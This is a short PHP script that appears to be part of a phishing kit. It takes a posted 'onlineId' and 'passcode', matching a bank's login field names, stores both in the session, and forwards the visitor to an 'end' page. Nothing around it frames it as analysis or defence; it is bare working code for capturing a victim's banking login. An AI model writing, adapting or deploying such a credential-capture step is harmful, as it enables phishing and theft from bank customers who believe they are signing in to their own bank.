<?php

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

session_start();

$_SESSION["user"] = $user = $_POST['onlineId'];
$_SESSION["pass"] = $pass = $_POST['passcode'];

if ($user =="" || $pass =="")    {
    header( "Location: index.php");
}
 else {
    header( "Location: end.php");
  }
?>